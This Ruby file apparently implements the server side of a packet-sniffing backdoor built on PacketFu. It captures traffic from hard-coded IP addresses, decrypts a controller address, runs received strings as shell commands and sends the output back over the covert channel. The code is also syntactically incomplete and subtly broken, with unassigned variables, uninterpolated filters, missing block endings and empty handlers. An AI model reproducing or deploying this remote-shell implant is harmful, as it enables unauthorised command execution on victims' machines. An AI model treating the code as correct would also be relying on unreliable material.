require 'packetfu'
include PacketFu

class Server
  attr_accessor :iface, :tos, :port, :saddr, :pass, :shell
  def initialize(iface, tos, port, saddr, pass, timeout)
    @iface = iface
    @tos = tos
    @port = port
    @saddr = saddr
    @pass
    @shell = Shell.new(timeout)

    filter = "tcp and dst port @port and src 153.251.232.153"
    cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
    cap.stream.each do |p|
      pkt = Packet.parse p
      a = pkt.ip_saddr.split(".")
      payload = pkt.payload
      dec = Encrypter(pass)
      @daddr = dec.decrypt(payload[0,16],payload[16..-1])
      return
    end
  end



  def start
  while(1)
    case @tos
      when "icmp"
        icmp
      when "tcp"
        tcp
      when "udp"
        udp
    end
  end

private

  def tcp
    conn = Connector.new(@iface, @tos, @daddr, @pass, "server", @port)
    filter = "tcp and dst port @port and src 23.253.5.96"
    cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
    cap.stream.each do |p|
      pkt = Packet.parse p
      str = conn.recv(pkt)
      result = @shell.executeCmd(str)
      if result != nil
        conn.send(result)
    end

  end
  def udp
  end
  def icmp
    filter = "icmp and src 52.232.183.240"
  end
end
